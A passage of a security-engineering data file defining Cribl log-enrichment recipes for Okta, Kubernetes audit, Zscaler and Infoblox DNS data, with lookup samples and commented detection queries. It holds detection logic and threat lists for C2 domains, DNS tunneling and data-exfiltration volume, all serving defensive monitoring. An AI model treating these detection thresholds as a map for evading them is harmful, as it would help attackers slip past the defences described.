          notes: 'Requires lat/lon from Okta client.geographicalContext and user baseline location. 900 km/h threshold accounts for commercial aviation. Adjust lower for higher sensitivity.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Session Activity Timeline',
        description: 'Group events by authenticationContext.externalSessionId to reconstruct full user session — login, app access, MFA challenges, logout.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['session_duration', 'session_app_count', 'session_mfa_challenges', 'session_events'],
        securityValue: 'Enables complete session reconstruction during investigation. See everything a compromised account did from login to logout in a single view.',
        personas: ['Incident Response', 'SOC', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search session reconstruction:\n// dataset="okta_logs" actor.alternateId="jsmith@company.com" earliest=-8h\n// | order by published asc\n// | summarize EventCount=count(), Apps=dcount(target.displayName),\n//     MFAChallenges=countif(eventType contains "factor"),\n//     FailedLogins=countif(outcome.result=="FAILURE"),\n//     session_duration=datetime_diff(\'minute\', max(published), min(published))\n//   by authenticationContext.externalSessionId',
          notes: 'Group by externalSessionId (Okta session identifier) for accurate session boundaries. Includes all activity within one authenticated session.'
        }
      },
      {
        name: 'Cross-Source Identity Correlation',
        description: 'Join actor.alternateId with endpoint (CrowdStrike), network (firewall), and cloud (AWS) events to build unified user activity timeline.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['endpoint_events', 'network_events', 'cloud_events', 'total_activity_score'],
        securityValue: 'Enables full kill-chain investigation across data sources: "after compromising Okta credentials, what did the attacker do on endpoints and in cloud?"',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search cross-dataset join:\n// dataset="okta_logs" actor.alternateId="jsmith@company.com" eventType="user.session.start" earliest=-4h\n// | join kind=left (\n//     dataset="edr_events" UserName="jsmith" earliest=-4h\n//     | summarize endpoint_events=count(), suspicious_processes=countif(process_reputation=="unknown") by ComputerName\n//   ) on actor.alternateId=UserName\n// | join kind=left (\n//     dataset="vpc_flow_logs" earliest=-4h\n//     | where src_hostname contains "jsmith"\n//     | summarize network_flows=count(), external_connections=countif(flow_direction=="egress")\n//   ) on actor.alternateId=associated_user',
          notes: 'Requires consistent user identity across datasets. Map Okta email → endpoint username → network asset owner for cross-source correlation.'
        }
      }
    ]
  },
  'k8s-audit-logs': {
    streamTime: [
      {
        name: 'Namespace Classification',
        description: 'Enrich objectRef.namespace with environment tier (production, staging, dev), team ownership, and sensitivity level.',
        criblFunction: 'Lookup',
        addedFields: ['ns_environment', 'ns_team', 'ns_sensitivity', 'ns_compliance_scope'],
        securityValue: 'Enables environment-aware detection rules — "exec into production pod" is critical while "exec into dev pod" is informational. Supports alert routing by team.',
        observabilityValue: 'Enables per-environment and per-team API server metrics. Identify which teams drive the most control plane load.',
        personas: ['Security Engineering', 'Platform Engineering', 'SRE', 'Cloud Security'],
        implementation: {
          lookupSample: 'namespace,environment,team,sensitivity,compliance_scope\nproduction,production,platform-team,high,PCI\nkube-system,infrastructure,platform-team,critical,SOC2\ndefault,development,various,low,none\nmonitoring,infrastructure,sre-team,medium,SOC2',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: k8s_namespaces.csv\n// Input: objectRef.namespace → namespace\n// Output: environment → ns_environment, team → ns_team, sensitivity → ns_sensitivity\n//\n// Result: { "objectRef.namespace": "production", ns_environment: "production", ns_team: "platform-team", ns_sensitivity: "high" }',
          notes: 'Generate from kubectl get namespaces with labels. Most K8s teams already label namespaces — extract those labels into the lookup CSV.'
        }
      },
      {
        name: 'Service Account Purpose Mapping',
        description: 'Map system:serviceaccount:* usernames to their purpose, owning team, and expected resource access patterns.',
        criblFunction: 'Lookup',
        addedFields: ['sa_purpose', 'sa_team', 'sa_expected_resources', 'sa_expected_namespaces'],
        securityValue: 'Enables "service account doing unexpected things" detection — a CI/CD SA accessing secrets outside its namespace is immediately suspicious with this context.',
        observabilityValue: 'Supports service account inventory and hygiene — identify unused SAs, over-privileged SAs, and SA activity outside expected patterns.',
        personas: ['Security Engineering', 'Platform Engineering', 'Cloud Security'],
        implementation: {
          lookupSample: 'service_account,purpose,team,expected_resources,expected_namespaces\nsystem:serviceaccount:ci:jenkins,CI/CD deployments,devops,deployments;services;configmaps,ci;staging;production\nsystem:serviceaccount:monitoring:prometheus,Metrics collection,sre,pods;nodes;services,all\nsystem:serviceaccount:default:default,Default (should not be used),none,none,default',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: k8s_service_accounts.csv\n// Input: user.username → service_account (prefix match)\n// Output: purpose → sa_purpose, team → sa_team, expected_resources → sa_expected_resources\n//\n// Result: { "user.username": "system:serviceaccount:ci:jenkins", sa_purpose: "CI/CD deployments", sa_team: "devops" }',
          notes: 'Audit service accounts with: kubectl get sa --all-namespaces. Flag any SA named "default" being used — it should be replaced with purpose-specific SAs.'
        }
      },
      {
        name: 'Container Image Reputation',
        description: 'When requestObject contains container specs, enrich image references with vulnerability scan results, signing status, and registry trust level.',
        criblFunction: 'Lookup',
        addedFields: ['image_vuln_critical', 'image_vuln_high', 'image_signed', 'image_registry_trusted'],
        securityValue: 'Tags pod creation events with image security posture. "Unsigned image with 5 critical CVEs deployed to production" is immediately actionable.',
        observabilityValue: 'Supports fleet-wide vulnerability posture dashboards — track percentage of running images with critical vulnerabilities.',
        personas: ['Cloud Security', 'Platform Engineering', 'Security Engineering', 'DevOps'],
        implementation: {
          lookupSample: 'image_prefix,vuln_critical,vuln_high,signed,registry_trusted\ndocker.io/library/,0,2,true,true\ngcr.io/company-prod/,0,0,true,true\ndocker.io/unknown-user/,unknown,unknown,false,false\nquay.io/company/,0,1,true,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: image_reputation.csv (from Trivy/Snyk scan results)\n// Input: Extract image from requestObject.spec.containers[].image → image_prefix (prefix match)\n// Output: vuln_critical → image_vuln_critical, signed → image_signed, registry_trusted → image_registry_trusted\n//\n// Pre-Eval: container_image = JSON.parse(requestObject)?.spec?.containers?.[0]?.image || \'\'\n//\n// Result: { container_image: "docker.io/unknown-user/sketchy:latest", image_signed: "false", image_registry_trusted: "false" }',
          notes: 'Populate from container scanning pipeline (Trivy, Snyk, Aqua). Update after every image build/scan. Flag unsigned images from untrusted registries.'
        }
      },
      {
        name: 'RBAC Intent Classification',
        description: 'For ClusterRole/RoleBinding changes, parse the rules array and classify the net permission change as restrictive, additive, or escalation.',
        criblFunction: 'Eval (custom logic)',
        addedFields: ['rbac_change_type', 'grants_cluster_admin', 'grants_secret_access', 'wildcard_permissions'],
        securityValue: 'Pre-classifies RBAC changes by risk level at pipeline. "ClusterRoleBinding grants wildcard permissions" is immediately critical without complex SIEM rule logic.',
        observabilityValue: 'Tracks RBAC change velocity and type distribution — supports change management dashboards for platform teams.',
        personas: ['Security Engineering', 'Cloud Security', 'Platform Engineering'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Parse requestObject for RBAC changes and classify risk:\n//\n// const rules = JSON.parse(requestObject)?.rules || [];\n// grants_cluster_admin = rules.some(r => r.resources?.includes(\'*\') && r.verbs?.includes(\'*\')) ? \'true\' : \'false\';\n// grants_secret_access = rules.some(r => r.resources?.includes(\'secrets\')) ? \'true\' : \'false\';\n// wildcard_permissions = rules.some(r => r.resources?.includes(\'*\') || r.verbs?.includes(\'*\')) ? \'true\' : \'false\';\n// rbac_change_type = grants_cluster_admin==\'true\' ? \'critical-escalation\'\n//   : wildcard_permissions==\'true\' ? \'broad-grant\' : \'scoped-grant\';\n//\n// Result: { rbac_change_type: "critical-escalation", grants_cluster_admin: "true", wildcard_permissions: "true" }',
          notes: 'Only applies to verb=create/update on resources clusterroles, roles, clusterrolebindings, rolebindings. Filter first for performance.'
        }
      },
      {
        name: 'Request Latency Calculation',
        description: 'Compute API server request latency from stageTimestamp minus requestReceivedTimestamp at pipeline level.',
        criblFunction: 'Eval',
        addedFields: ['request_latency_ms', 'latency_bucket'],
        securityValue: 'Unusually high latency on specific requests can indicate resource exhaustion attacks or crypto-mining impacting control plane performance.',
        observabilityValue: 'Primary metric for API server performance monitoring. Enables percentile tracking and alerting without requiring downstream calculation.',
        personas: ['SRE', 'Platform Engineering', 'NOC'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Expression:\n// request_latency_ms = (new Date(stageTimestamp) - new Date(requestReceivedTimestamp))\n// latency_bucket = request_latency_ms < 100 ? \'fast\' : request_latency_ms < 500 ? \'normal\' : request_latency_ms < 2000 ? \'slow\' : \'critical\'\n//\n// Result: { requestReceivedTimestamp: "2026-06-06T14:22:18.100Z", stageTimestamp: "2026-06-06T14:22:18.250Z", request_latency_ms: 150, latency_bucket: "normal" }',
          notes: 'Both timestamps come from the K8s audit event. Simple subtraction gives API server processing time. Alert on "critical" bucket events.'
        }
      }
    ],
    searchTime: [
      {
        name: 'RBAC Policy Simulation',
        description: 'At investigation time, join audit events with current RBAC policy to show what the user CAN do vs what they DID do.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['user_permissions', 'permission_utilization', 'unused_capabilities'],
        securityValue: 'During incident response, immediately shows the blast radius of a compromised identity — all resources accessible even if not yet accessed.',
        personas: ['Incident Response', 'Cloud Security', 'Platform Engineering'],
        implementation: {
          example: '// Cribl Search join:\n// dataset="k8s_audit" user.username="system:serviceaccount:ci:jenkins" earliest=-1h\n// | summarize ActualResources=dcount(objectRef.resource), ActualVerbs=makeset(verb), ActualNamespaces=makeset(objectRef.namespace) by user.username\n// | join kind=left (\n//     dataset="k8s_rbac_policy"\n//     | where subject contains "jenkins"\n//     | summarize AllowedResources=makeset(resource), AllowedVerbs=makeset(verb)\n//   ) on user.username=subject',
          notes: 'Requires RBAC policy exported as a dataset (kubectl get clusterrolebindings -o json). Enables "what could this account do vs what it did" gap analysis.'
        }
      },
      {
        name: 'Deployment Diff Correlation',
        description: 'Join deployment/update events with Git commit metadata to identify what code change triggered the deployment.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['git_commit', 'git_author', 'change_description', 'pr_number'],
        securityValue: 'During investigation of suspicious deployments, immediately identifies the source code change and author without manual Git/CI lookup.',
        observabilityValue: 'Correlates deployment failures with specific code changes. "Deployment failed because of commit X by author Y" speeds up rollback decisions.',
        personas: ['Platform Engineering', 'SRE', 'DevOps', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search cross-dataset join:\n// dataset="k8s_audit" verb="create" objectRef.resource=="deployments" earliest=-2h\n// | extend app = objectRef.name\n// | join kind=left (\n//     dataset="github_events" type=="push" earliest=-2h\n//     | project commit=sha, author=pusher, message=head_commit.message, pr=number\n//   ) on app=repository_name\n// | extend deployment_context = strcat("Deployed by ", user.username, " | Git: ", author, " - ", message)',
          notes: 'Requires GitHub/GitLab webhook events stored in Cribl Lake. Maps K8s deployment events to the code change that triggered them.'
        }
      }
    ]
  },
  'zscaler-web-logs': {
    streamTime: [
      {
        name: 'External Threat Intelligence',
        description: 'Enrich hostname against external threat feeds beyond Zscaler\'s built-in categorization (custom feeds, industry ISACs, internal blocklists).',
        criblFunction: 'Lookup',
        addedFields: ['external_threat_score', 'external_threat_category', 'threat_feed_name', 'last_reported'],
        securityValue: 'Augments Zscaler\'s native threat detection with organization-specific and industry-specific threat feeds. Catches threats Zscaler categorization misses.',
        observabilityValue: 'Supports multi-source threat detection coverage metrics — "what percentage of threats are caught by Zscaler vs external feeds?"',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          lookupSample: 'domain,threat_score,category,feed_name,last_reported\nevil-c2.com,99,C2,Mandiant,2026-06-05\nphishing-bank.net,95,Phishing,PhishTank,2026-06-04\ncryptominer.xyz,80,Cryptomining,AbuseIPDB,2026-06-03',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_domains.csv\n// Pre-Eval: base_hostname = hostname.split(\'.\').slice(-2).join(\'.\')\n// Input: base_hostname → domain\n// Output: threat_score → external_threat_score, category → external_threat_category, feed_name → threat_feed_name\n//\n// Result: { hostname: "beacon.evil-c2.com", external_threat_score: 99, external_threat_category: "C2" }',
          notes: 'Supplements Zscaler native categorization with org-specific and industry feeds. Useful when Zscaler has not yet categorized newly-registered threat infrastructure.'
        }
      },
      {
        name: 'SaaS Application Inventory Classification',
        description: 'Map hostname to sanctioned/tolerated/unsanctioned status, data sensitivity level, and application category from corporate SaaS inventory.',
        criblFunction: 'Lookup',
        addedFields: ['saas_sanctioned', 'saas_category', 'saas_data_sensitivity', 'saas_contract_owner'],
        securityValue: 'Enables Shadow IT detection with business context — not just "unsanctioned app" but "unsanctioned file sharing app accessing sensitive data." Supports DLP correlation.',
        observabilityValue: 'Powers SaaS utilization dashboards, license optimization (actual usage vs purchased seats), and application rationalization analysis.',
        personas: ['Security Engineering', 'Cloud Security', 'Compliance', 'Platform Engineering'],
        implementation: {
          lookupSample: 'hostname_pattern,sanctioned,category,data_sensitivity,contract_owner\n*.slack.com,true,collaboration,internal,IT\n*.dropbox.com,false,file-sharing,confidential,none\n*.salesforce.com,true,crm,confidential,Sales\n*.wetransfer.com,false,file-sharing,confidential,none',
          example: '// Cribl Stream → Processing → Lookup Function (wildcard/regex match)\n// Lookup File: saas_inventory.csv\n// Input: hostname → hostname_pattern (wildcard match)\n// Output: sanctioned → saas_sanctioned, category → saas_category, data_sensitivity → saas_data_sensitivity\n//\n// Result: { hostname: "dl.dropbox.com", saas_sanctioned: "false", saas_category: "file-sharing", saas_data_sensitivity: "confidential" }',
          notes: 'Source from CASB (Netskope, MCAS) or maintain manually. Focus on file-sharing, cloud storage, and AI services for DLP correlation.'
        }
      },
      {
        name: 'User Risk Score Injection',
        description: 'Enrich user field with current risk score from identity platform (Okta, UEBA) to combine web activity with identity risk context.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_score', 'user_risk_level', 'user_risk_factors'],
        securityValue: 'Correlates web browsing behavior with identity risk — "high-risk user uploading to personal cloud storage" combines two signals for stronger detection.',
        observabilityValue: 'Supports risk-stratified user experience metrics — do high-risk users receive different proxy performance due to additional inspection?',
        personas: ['SOC', 'Security Engineering', 'Identity Team'],
        implementation: {
          lookupSample: 'username,risk_score,risk_level,risk_factors\njsmith,25,low,none\nadmin-bob,75,high,privileged;failed-mfa\ncontractor-jane,60,medium,contractor;new-device',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_scores.csv\n// Input: user → username\n// Output: risk_score → user_risk_score, risk_level → user_risk_level, risk_factors → user_risk_factors\n//\n// Result: { user: "admin-bob", user_risk_score: 75, user_risk_level: "high" }',
          notes: 'Same file as CrowdStrike/Okta user risk enrichment. Single source of truth updated every 15 minutes from identity platform.'
        }
      },
      {
        name: 'Data Transfer Volume Tracking',
        description: 'Calculate cumulative upload volume per user per day (rolling sum of reqsize for POST/PUT to cloud storage). Flag threshold breaches.',
        criblFunction: 'Eval (Stateful)',
        addedFields: ['user_daily_upload_bytes', 'upload_threshold_exceeded', 'upload_anomaly_factor'],
        securityValue: 'Enables data exfiltration detection based on cumulative volume rather than per-transaction size. A user uploading 500MB across 100 small POSTs is suspicious.',
        observabilityValue: 'Supports per-department bandwidth budgeting, identifies users driving disproportionate upload costs.',
        personas: ['SOC', 'Security Engineering', 'Compliance', 'NOC'],
        implementation: {
          example: '// Cribl Stream → Processing → Redis/Aggregation Function\n// Stateful tracking of per-user daily upload volume:\n//\n// Option A: Redis INCRBY\n//   Key: "upload:{user}:{date}" TTL: 86400\n//   INCRBY value: reqsize (for POST/PUT methods only)\n//   user_daily_upload_bytes = Redis GET "upload:{user}:{date}"\n//\n// Option B: Eval with Pipeline Aggregation\n//   Filter: reqmethod in ("POST", "PUT") AND hostname matches cloud storage patterns\n//   Aggregate: sum(reqsize) by user per 24h window\n//   upload_threshold_exceeded = user_daily_upload_bytes > 500000000 ? \'true\' : \'false\'  // 500MB threshold\n//\n// Result: { user: "jsmith", user_daily_upload_bytes: 750000000, upload_threshold_exceeded: "true" }',
          notes: 'Track uploads to known cloud storage (Google Drive, OneDrive, Dropbox, S3) specifically. General web browsing POST requests should be excluded.'
        }
      },
      {
        name: 'Newly Registered Domain Detection',
        description: 'Enrich hostname with domain registration age. Flag domains registered within the last 30 days.',
        criblFunction: 'Lookup',
        addedFields: ['domain_age_days', 'newly_registered', 'registrar'],
        securityValue: 'Newly-registered domains are disproportionately associated with phishing, malware, and C2 infrastructure. Pipeline-level flagging eliminates downstream WHOIS queries.',
        observabilityValue: 'Minimal direct observability value, but "visits to newly registered domains per day" is a useful security posture metric.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          lookupSample: 'domain,registration_date,age_days,newly_registered,registrar\nsuspicious-site.xyz,2026-06-01,5,true,Njalla\nlegitimate-company.com,2015-03-20,4096,false,GoDaddy',
          example: '// Cribl Stream → Processing → Lookup Function\n// Pre-Eval: base_domain = hostname.split(\'.\').slice(-2).join(\'.\')\n// Lookup File: domain_whois.csv\n// Input: base_domain → domain\n// Output: age_days → domain_age_days, newly_registered, registrar\n//\n// Result: { hostname: "login.suspicious-site.xyz", domain_age_days: 5, newly_registered: "true" }',
          notes: 'Same WHOIS lookup file used for Windows DNS and Infoblox enrichments. One lookup file, multiple pipeline consumers.'
        }
      }
    ],
    searchTime: [
      {
        name: 'User Browsing Session Reconstruction',
        description: 'Group transactions by user + time window to reconstruct browsing sessions and identify activity patterns.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['session_duration', 'sites_visited', 'total_bytes_transferred', 'risk_events_in_session'],
        securityValue: 'Enables investigation of "what else did the user do before/after accessing the phishing site?" without manual timeline reconstruction.',
        personas: ['Incident Response', 'SOC', 'Compliance'],
        implementation: {
          example: '// Cribl Search session analysis:\n// dataset="zscaler_logs" user="jsmith" earliest=-4h\n// | order by timestamp asc\n// | summarize sites_visited=dcount(hostname), total_bytes=sum(reqsize+respsize),\n//     risk_events=countif(external_threat_score > 50), duration_min=datetime_diff(\'minute\', max(timestamp), min(timestamp))\n//   by user, department\n// | extend session_risk = iif(risk_events > 0, "suspicious", "normal")',
          notes: 'Zscaler logs are per-transaction — group by user and time window for session-level analysis. Include risk_events count for quick triage.'
        }
      },
      {
        name: 'DLP Incident Correlation',
        description: 'Join DLP-triggered events with email security and endpoint DLP events to identify multi-channel data exfiltration attempts.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['related_email_dlp', 'related_endpoint_dlp', 'exfiltration_channels'],
        securityValue: 'Identifies sophisticated exfiltration using multiple channels — user blocked from email attachment uploads same data via web proxy to personal cloud storage.',
        personas: ['Incident Response', 'Security Engineering', 'Compliance'],
        implementation: {
          example: '// Cribl Search cross-dataset join:\n// dataset="zscaler_logs" dlpengine != "" earliest=-24h\n// | summarize WebDLP=count(), Bytes=sum(reqsize), Sites=makeset(hostname) by user\n// | join kind=left (\n//     dataset="email_dlp_events" earliest=-24h\n//     | summarize EmailDLP=count(), Recipients=makeset(recipient) by sender\n//   ) on user=sender\n// | extend exfiltration_channels = iif(WebDLP > 0 && EmailDLP > 0, "multi-channel", "single-channel")',
          notes: 'Correlates web DLP triggers with email DLP events to identify users attempting exfiltration via multiple channels. High-confidence insider threat signal.'
        }
      }
    ]
  },
  'infoblox-dns': {
    streamTime: [
      {
        name: 'Domain Entropy Scoring',
        description: 'Calculate Shannon entropy of queried domain labels to identify algorithmically-generated domains and DNS tunneling payloads.',
        criblFunction: 'Eval (custom expression)',
        addedFields: ['domain_entropy', 'subdomain_entropy', 'entropy_risk_level', 'label_count'],
        securityValue: 'Quantitative DGA/tunneling signal at ingest time. Combined with Infoblox Threat Defense, provides layered detection covering both signature and behavioral indicators.',
        observabilityValue: 'Fleet-level "average entropy" metric — sudden increases across many clients indicate spreading malware.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Same entropy calculation as Windows DNS, but also calculate subdomain entropy separately:\n//\n// const parts = query_name.split(\'.\');\n// const subdomain = parts.slice(0, -2).join(\'\');  // Everything except base domain\n// const base = parts.slice(-2).join(\'.\');\n// domain_entropy = C.Text.shannonEntropy(query_name.replace(/\\.[^.]+\\.[^.]+$/, \'\'));\n// subdomain_entropy = subdomain.length > 0 ? C.Text.shannonEntropy(subdomain) : 0;\n// label_count = parts.length;\n// entropy_risk_level = (subdomain_entropy > 4.0 && label_count > 4) ? \'high\' : subdomain_entropy > 3.5 ? \'medium\' : \'low\'\n//\n// Result: { query_name: "aGVsbG8.d29ybGQ.tunnel.evil.com", domain_entropy: 4.2, subdomain_entropy: 4.8, entropy_risk_level: "high", label_count: 5 }',
          notes: 'For Infoblox, also check label_count — DNS tunneling often uses many subdomain labels. Legitimate domains rarely exceed 4 labels.'
        }
      },
      {
        name: 'DHCP Lease Correlation',
        description: 'Enrich client_ip with hostname, MAC address, device type, and DHCP scope from Infoblox IPAM/DHCP integration.',
        criblFunction: 'Lookup',
        addedFields: ['client_hostname', 'client_mac', 'device_type', 'dhcp_scope', 'device_os'],
        securityValue: 'Converts dynamic IPs to device identities. Essential for "which device queried the C2 domain" without manual DHCP log correlation. Infoblox IPAM makes this natively available.',
        observabilityValue: 'Enables per-device and per-device-type DNS metrics. Identify IoT devices generating excessive queries, BYOD vs corporate device resolution patterns.',
        personas: ['SOC', 'Incident Response', 'NOC', 'DDI Team'],
        implementation: {
          lookupSample: 'ip,hostname,mac,device_type,scope,os\n10.1.2.100,WKSTN-JSMITH,AA:BB:CC:11:22:33,workstation,Corp-Users,Windows 11\n10.1.5.50,IOT-CAMERA-01,DD:EE:FF:44:55:66,iot-camera,IoT-Devices,Embedded\n10.1.6.200,BYOD-PHONE-42,11:22:33:AA:BB:CC,mobile,BYOD-WiFi,iOS',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: infoblox_dhcp_leases.csv (exported from Infoblox IPAM)\n// Input: client_ip → ip\n// Output: hostname → client_hostname, mac → client_mac, device_type, scope → dhcp_scope, os → device_os\n//\n// Infoblox advantage: IPAM + DHCP in one platform — use WAPI to export:\n//   GET /wapi/v2.12/lease?_return_fields=address,hardware,client_hostname,fingerprint\n//\n// Result: { client_ip: "10.1.5.50", client_hostname: "IOT-CAMERA-01", device_type: "iot-camera" }',
          notes: 'Infoblox WAPI provides richer device fingerprinting than standalone DHCP. Export includes OS fingerprint data. Refresh every 5 minutes for dynamic environments.'
        }
      },
      {
        name: 'Threat Intelligence Domain Lookup',
        description: 'Enrich query_name against external threat feeds in addition to Infoblox Threat Defense RPZ. Catches domains not yet in RPZ feeds.',
        criblFunction: 'Lookup',
        addedFields: ['external_threat_score', 'external_threat_category', 'external_feed_source', 'domain_first_seen'],
        securityValue: 'Provides defense-in-depth beyond RPZ — catches newly-identified threats from industry ISACs, internal research, and commercial feeds not yet propagated to Infoblox Threat Defense.',
        observabilityValue: 'Supports multi-source threat coverage analysis — "what percentage of threats are caught by RPZ vs external feeds?"',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          lookupSample: 'domain,threat_score,category,feed_source,first_seen\nevil-c2.com,99,C2,Mandiant,2026-05-20\ndga-generated.net,85,DGA,Internal-ML,2026-06-04\nphish-bank.com,95,Phishing,PhishTank,2026-06-01',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_domains.csv (same file used across DNS sources)\n// Pre-Eval: base_domain = query_name.split(\'.\').slice(-2).join(\'.\')\n// Input: base_domain → domain\n// Output: threat_score → external_threat_score, category → external_threat_category, feed_source → external_feed_source\n//\n// Note: This supplements Infoblox Threat Defense RPZ — catches threats not yet in RPZ feeds\n//\n// Result: { query_name: "beacon.evil-c2.com", external_threat_score: 99, external_threat_category: "C2" }',
          notes: 'Layer on top of Infoblox Threat Defense. RPZ handles blocking; this enrichment tags events for SIEM correlation and coverage gap analysis.'
        }
      },
      {
        name: 'Domain Age Enrichment',
        description: 'Lookup query_name base domain against WHOIS/registration data to identify newly-registered domains.',
        criblFunction: 'Lookup',
        addedFields: ['domain_age_days', 'newly_registered', 'registrar', 'registration_country'],
        securityValue: 'Newly-registered domains are heavily associated with phishing, malware C2, and DGA. Combined with entropy, provides very high-confidence threat signal.',
        observabilityValue: 'Minimal direct value, but supports "new domain query rate" as a security posture metric.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          lookupSample: 'domain,registration_date,age_days,newly_registered,registrar,registration_country\nbrand-new-malware.com,2026-06-03,3,true,Njalla,PA\ngoogle.com,1997-09-15,10492,false,MarkMonitor,US',
          example: '// Cribl Stream → Processing → Lookup Function\n// Pre-Eval: base_domain = query_name.split(\'.\').slice(-2).join(\'.\')\n// Lookup File: domain_whois.csv\n// Input: base_domain → domain\n// Output: age_days → domain_age_days, newly_registered, registrar, registration_country\n//\n// Result: { query_name: "login.brand-new-malware.com", domain_age_days: 3, newly_registered: "true", registrar: "Njalla" }',
          notes: 'Njalla and similar privacy registrars correlate with malicious infrastructure. Include registrar in enrichment for additional signal.'
        }
      },
      {
        name: 'Internal Zone Classification',
        description: 'Tag queries as internal vs external based on zone membership. Classify internal zones by function (AD, infrastructure, application services).',
        criblFunction: 'Lookup',
        addedFields: ['zone_type', 'zone_function', 'is_internal', 'zone_owner_team'],
        securityValue: 'Enables clean separation of detection scopes. External queries get threat analysis; internal queries get infrastructure monitoring. Reduces false positives dramatically.',
        observabilityValue: 'Enables separate health dashboards for AD resolution, application service discovery, and internet DNS. Routes alerts to the correct team.',
        personas: ['NOC', 'DDI Team', 'Active Directory Team', 'SRE'],
        implementation: {
          lookupSample: 'zone_suffix,zone_type,zone_function,is_internal,owner_team\n.corp.local,internal,active-directory,true,identity-team\n._msdcs.corp.local,internal,dc-locator,true,identity-team\n.svc.cluster.local,internal,kubernetes-service,true,platform-team\n.internal.company.com,internal,application-services,true,sre-team',
          example: '// Cribl Stream → Processing → Eval + Lookup\n// Step 1 - Eval: Extract zone from query_name\n//   query_zone = \'.\' + query_name.split(\'.\').slice(-3).join(\'.\')  // last 3 labels\n// Step 2 - Lookup (suffix match):\n//   Input: query_zone matches zone_suffix\n//   Output: zone_type, zone_function, is_internal, owner_team → zone_owner_team\n//\n// Result: { query_name: "dc01._msdcs.corp.local", zone_type: "internal", zone_function: "dc-locator", is_internal: "true" }',
          notes: 'Essential for splitting detection logic: external queries get threat analysis, internal queries get infrastructure health monitoring. Routes alerts to correct team.'
        }
      },
      {
        name: 'Client Subnet/VLAN Mapping',
        description: 'Map client_ip to VLAN, subnet name, building/floor, and network zone using Infoblox IPAM network container data.',
        criblFunction: 'Lookup',
        addedFields: ['client_vlan', 'client_subnet_name', 'client_location', 'client_network_zone'],
        securityValue: 'Provides physical location context for DNS security events — "malware query from server VLAN" vs "malware query from guest WiFi" have very different response urgency.',
        observabilityValue: 'Enables location-based DNS health monitoring, identifies subnets with resolution issues, supports network segmentation verification.',
        personas: ['NOC', 'DDI Team', 'Security Engineering', 'Network Engineering'],
        implementation: {
          lookupSample: 'cidr,vlan,subnet_name,location,network_zone\n10.1.0.0/24,100,Users-Floor1,Building-A-F1,corporate\n10.1.1.0/24,101,Users-Floor2,Building-A-F2,corporate\n10.2.0.0/24,200,Servers-DMZ,DC-East,dmz\n10.5.0.0/24,500,IoT-Building,Building-A,iot',
          example: '// Cribl Stream → Processing → Lookup Function (CIDR match)\n// Lookup File: infoblox_networks.csv (exported from Infoblox IPAM network containers)\n// Input: client_ip → cidr (CIDR match mode)\n// Output: vlan → client_vlan, subnet_name → client_subnet_name, location → client_location, network_zone → client_network_zone\n//\n// Infoblox export: GET /wapi/v2.12/network?_return_fields=network,extattrs,comment\n//\n// Result: { client_ip: "10.5.0.42", client_vlan: "500", client_subnet_name: "IoT-Building", client_network_zone: "iot" }',
          notes: 'Infoblox IPAM is the authoritative source for subnet/VLAN mappings. Export extensible attributes (extattrs) for custom metadata like location and zone.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Client DNS Timeline',
        description: 'Reconstruct full DNS query timeline for a specific client to identify pre- and post-compromise activity.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['query_timeline', 'unique_domains', 'threat_queries_count', 'nxdomain_rate'],
        securityValue: 'During incident response, see everything a compromised client resolved — identifies all C2 domains, lateral movement targets, and exfiltration destinations in one view.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search client investigation:\n// dataset="infoblox_dns" client_ip="10.1.2.100" earliest=-24h\n// | order by timestamp asc\n// | summarize unique_domains=dcount(query_name), total_queries=count(),\n//     threat_queries=countif(external_threat_score > 50),\n//     nxdomain_rate=round(countif(response_code=="NXDOMAIN") * 100.0 / count(), 1)\n//   by client_ip, client_hostname\n// | extend risk_assessment = iif(threat_queries > 0, "compromised-likely", iif(nxdomain_rate > 30, "dga-possible", "normal"))',
          notes: 'First query for any DNS-related investigation: "show me everything this client resolved in the last 24 hours." Immediate scope assessment.'
        }
      },
      {
        name: 'RPZ Effectiveness Analysis',
        description: 'Join RPZ block events with subsequent network flow data to verify that blocked DNS queries did not reach the destination through alternative resolution.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['post_block_connection_attempt', 'alternative_resolution_detected', 'block_effectiveness'],
        securityValue: 'Validates that DNS-level blocking is actually preventing connectivity. Identifies cases where malware uses hardcoded IPs or alternative DNS resolvers to bypass RPZ.',
        personas: ['Security Engineering', 'Threat Hunting', 'DDI Team'],
        implementation: {
          example: '// Cribl Search cross-dataset join:\n// dataset="infoblox_dns" rpz_action=="blocked" earliest=-24h\n// | summarize BlockedQueries=count() by client_ip, query_name\n// | join kind=left (\n//     dataset="firewall_logs" earliest=-24h\n//     | where action=="allow"\n//     | summarize Connections=count() by source_ip, destination_ip\n//   ) on client_ip=source_ip\n// | extend bypass_detected = iif(Connections > 0, "true", "false")\n// | where bypass_detected == "true"',
